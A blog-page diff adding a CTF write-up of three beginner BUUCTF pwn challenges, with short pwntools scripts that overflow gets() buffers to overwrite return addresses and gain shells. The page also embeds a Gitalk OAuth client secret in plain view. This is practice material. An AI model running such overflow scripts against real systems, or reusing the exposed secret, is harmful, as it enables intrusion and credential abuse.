@@ -6,18 +6,38 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://qingmu-z.github.io">
-  <title>Archives: 2020 | 清霂qingmu-z</title>
+  <title>buuctf pwn | 清霂qingmu-z</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="河南大学大一新生">
-<meta property="og:type" content="website">
-<meta property="og:title" content="清霂qingmu-z">
-<meta property="og:url" content="https://qingmu-z.github.io/archives/2020/page/2/index.html">
+  <meta name="description" content="@TOC 1.test_your_nc先用exeinfo查壳，是64位的程序 用64位ida静态分析一下，找到main函数F5反汇编，看到system(“&#x2F;bin&#x2F;sh”)system()的作用———执行shell命令也就是向dos发送一条指令。即执行&#x2F;bin&#x2F;sh命令，获得shell权限用虚拟机连node3.buuoj.cn:27191nc node3.buuoj.cn 27191查看文件目录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf pwn">
+<meta property="og:url" content="https://qingmu-z.github.io/2021/01/30/buu/buuctf%20pwn/index.html">
 <meta property="og:site_name" content="清霂qingmu-z">
-<meta property="og:description" content="河南大学大一新生">
+<meta property="og:description" content="@TOC 1.test_your_nc先用exeinfo查壳，是64位的程序 用64位ida静态分析一下，找到main函数F5反汇编，看到system(“&#x2F;bin&#x2F;sh”)system()的作用———执行shell命令也就是向dos发送一条指令。即执行&#x2F;bin&#x2F;sh命令，获得shell权限用虚拟机连node3.buuoj.cn:27191nc node3.buuoj.cn 27191查看文件目录">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021013014435454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130144639424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130144739809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130145430819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130145616669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130150104514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130171350855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130150240428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130150301357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130151322482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130151558588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130171812331.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021013017315155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130173233145.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210130173530507.png">
+<meta property="article:published_time" content="2021-01-30T09:38:43.015Z">
+<meta property="article:modified_time" content="2021-01-30T09:40:38.308Z">
 <meta property="article:author" content="朱登榜">
-<meta property="article:tag" content="c++,二进制，leetcode,信息安全">
+<meta property="article:tag" content="buu">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2021013014435454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70">
   
     <link rel="alternative" href="/atom.xml" title="清霂qingmu-z" type="application/atom+xml">
   
@@ -224,246 +244,270 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
           </div>
           <div id="js-content" class="content-ll">
             
-  
-  
+<article id="post-buu/buuctf pwn" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      buuctf pwn
+    </h1>
+  
+
+<!--显示阅读次数-->
+
+  <br/>
+  <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+  <span class="icon-sort"></span>
+  <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+    阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+  </span>
+  </a>
+
+<!--显示阅读次数完毕-->
+        
+        <a href="/2021/01/30/buu/buuctf%20pwn/" class="archive-article-date">
+  	<time datetime="2021-01-30T09:38:43.015Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-30</time>
+</a>
+        <!-- 需要添加的位置 -->
+        <!-- 开始添加字数统计-->
+        
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  字数统计: </span>
+        <span class="post-count" style="color:#ef7522;font-size:14px;">476字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text" style="color:#ef7522;font-size:14px;">  阅读时长: </span>
+        <span class="post-count" style="color:#ef7522;font-size:14px;">2分</span>
+      </span>
+    </span>
+</div>
+          
+        <!-- 添加完成 -->
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
+<h1 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a>1.test_your_nc</h1><p>先用exeinfo查壳，是64位的程序<br><img src="https://img-blog.csdnimg.cn/2021013014435454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>用64位ida静态分析一下，找到main函数<br><img src="https://img-blog.csdnimg.cn/20210130144639424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>F5反汇编，看到system(“/bin/sh”)<br><code>system()的作用———执行shell命令也就是向dos发送一条指令。</code><br>即执行/bin/sh命令，获得shell权限<br><img src="https://img-blog.csdnimg.cn/20210130144739809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210130145430819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用虚拟机连node3.buuoj.cn:27191<br><code>nc node3.buuoj.cn 27191</code><br>查看文件目录<br><code>ls</code><br>查看flag中的内容<br><code>cat flag</code><br><img src="https://img-blog.csdnimg.cn/20210130145616669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="2-pwn1"><a href="#2-pwn1" class="headerlink" title="2.pwn1"></a>2.pwn1</h1><p>查壳，64位程序<br><img src="https://img-blog.csdnimg.cn/20210130150104514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用虚拟机看一下有什么保护<br><img src="https://img-blog.csdnimg.cn/20210130171350855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>64位ida静态分析，看一看main函数以及有特殊含义的函数<br>发现main函数中有gets()函数，所以有栈溢出漏洞<br><code>gets()函数可以输入无限长度的字符，所以容易超出系统分配的栈的最大长度。而在调用函数时栈中存有调用函数之后的命令的地址，所以只要将原本应该返回的地址覆盖掉，就能让程序进入fun函数，从而得到权限。</code><br><img src="https://img-blog.csdnimg.cn/20210130150240428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现fun函数可以获得shell权限，那么只要让程序执行fun函数即可<br><img src="https://img-blog.csdnimg.cn/20210130150301357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入到gets函数的s中<br><img src="https://img-blog.csdnimg.cn/20210130151322482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们要将阴影部分填充入垃圾数据，在发送fun所在地址到r即可<br><img src="https://img-blog.csdnimg.cn/20210130151558588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line"></span><br><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(os&#x3D;&quot;linux&quot;,arch&#x3D;&quot;amd64&quot;,log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">#zdb&#x3D;process(&quot;.&#x2F;pwn1&quot;)</span><br><span class="line">zdb&#x3D;remote(&quot;node3.buuoj.cn&quot;,29798)</span><br><span class="line"></span><br><span class="line">payload&#x3D;b&#39;a&#39;*(0x0f-0x00+8)+p64(0x040118a)</span><br><span class="line"></span><br><span class="line">#zdb.sendlineafter(&quot;please input&quot;,payload)这种写法能打通本地，但打不通远程，不懂为啥</span><br><span class="line">zdb.sendline(payload)</span><br><span class="line">zdb.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3.warmup_csaw_2016"></a>3.warmup_csaw_2016</h1><p>file<br>checksec<br><img src="https://img-blog.csdnimg.cn/20210130171812331.png" alt="在这里插入图片描述"><br>ida64<br>有gets函数栈溢出漏洞<br><img src="https://img-blog.csdnimg.cn/2021013017315155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjY4OTYxMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入sub_40060D中发现<br><img src="https://img-blog.csdnimg.cn/20210130173233145.png" alt="在这里插入图片描述"><br>运行一下程序<br>程序直接把system地址打印出来了,直接用就可以<br><img src="https://img-blog.csdnimg.cn/20210130173530507.png" alt="在这里插入图片描述"><br>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">from pwn import*</span><br><span class="line">context(os&#x3D;&quot;linux&quot;,arch&#x3D;&quot;amd64&quot;,log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">zdb&#x3D;remote(&quot;node3.buuoj.cn&quot;,29734)</span><br><span class="line"></span><br><span class="line">payload&#x3D;b&#39;a&#39;*(0x40+8)+p64(0x40060d)</span><br><span class="line"></span><br><span class="line">zdb.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">zdb.sendline(payload)</span><br><span class="line">zdb.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+
+
+       
+         <div class="essayending">
+           <div>
+            <div style="text-align:center;color: #ccc;font-size:22px;">
+            <br/>
+            <br/>
+ -------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------
+            <br/>
+            <br/>
+             <br/>
+             <br/>
+            </div>
+           </div>
+         </div>
+         
+
+  
+
+
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/22/leetcode/leetcode%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/" class="archive-article-date">
-  	<time datetime="2020-11-21T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/22/leetcode/leetcode%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/">leetcode 有效的括号</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">buu</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">leetcode</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">栈</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://qingmu-z.github.io/2021/01/30/buu/buuctf%20pwn/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/22/%E4%BF%A1%E6%81%AF%E5%AD%A6%E5%A5%A5%E8%B5%9B%E4%B8%80%E6%9C%AC%E9%80%9A/%E9%AB%98%E7%B2%BE%E5%BA%A6%E8%AE%A1%E7%AE%97/" class="archive-article-date">
-  	<time datetime="2020-11-21T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-22</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/01/21/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">寒假第一周学习总结</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/22/%E4%BF%A1%E6%81%AF%E5%AD%A6%E5%A5%A5%E8%B5%9B%E4%B8%80%E6%9C%AC%E9%80%9A/%E9%AB%98%E7%B2%BE%E5%BA%A6%E8%AE%A1%E7%AE%97/">信息学奥赛一本通 高精度计算</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">信息学奥赛一本通</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">算法</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-test-your-nc"><span class="toc-number">1.</span> <span class="toc-text">1.test_your_nc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-pwn1"><span class="toc-number">2.</span> <span class="toc-text">2.pwn1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-warmup-csaw-2016"><span class="toc-number">3.</span> <span class="toc-text">3.warmup_csaw_2016</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/20/leetcode/leetcode%20%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%20%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9%E3%80%82%E3%80%82%E3%80%82/" class="archive-article-date">
-  	<time datetime="2020-11-19T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-20</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/20/leetcode/leetcode%20%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C%20%E6%A2%A6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%B0%E6%96%B9%E3%80%82%E3%80%82%E3%80%82/">leetcode 两数之和 梦开始的地方。。。</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">leetcode</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">哈希</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/20/leetcode/leetcode%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E5%9B%9E%E6%96%87%E6%95%B0/" class="archive-article-date">
-  	<time datetime="2020-11-19T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/20/leetcode/leetcode%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E5%9B%9E%E6%96%87%E6%95%B0/">leetcode 回文数</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">leetcode</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
-          
+	<div id="gitalk-container"></div>
+	<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '33931d9e122463275cdd',
+        clientSecret: 'd5606411ea5f6bfd13d4a1603a38dc4f77046949',
+        repo: 'qingmu-z.github.io',
+        owner: 'qingmu-z',
+        admin: 'qingmu-z',
+        id: md5(location.pathname),
+        distractionFreeMode: true
+    }).render('gitalk-container')
+</script>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/11/20/leetcode/leetcod%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/" class="archive-article-date">
-  	<time datetime="2020-11-19T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/11/20/leetcode/leetcod%20%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%20%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/">leetcode 整数反转</a>
-    </h1>
+
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">acm</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">leetcode</a>
-        		</li>
-      		
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2020/">&amp;laquo; Prev</a><a class="page-number" href="/archives/2020/">1</a><span class="page-number current">2</span>
-    </nav>
   
 
 
@@ -498,8 +542,8 @@ color="0,0,255" opacity='0.9' zIndex="-1" count="300" src="//cdn.bootcss.com/can
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
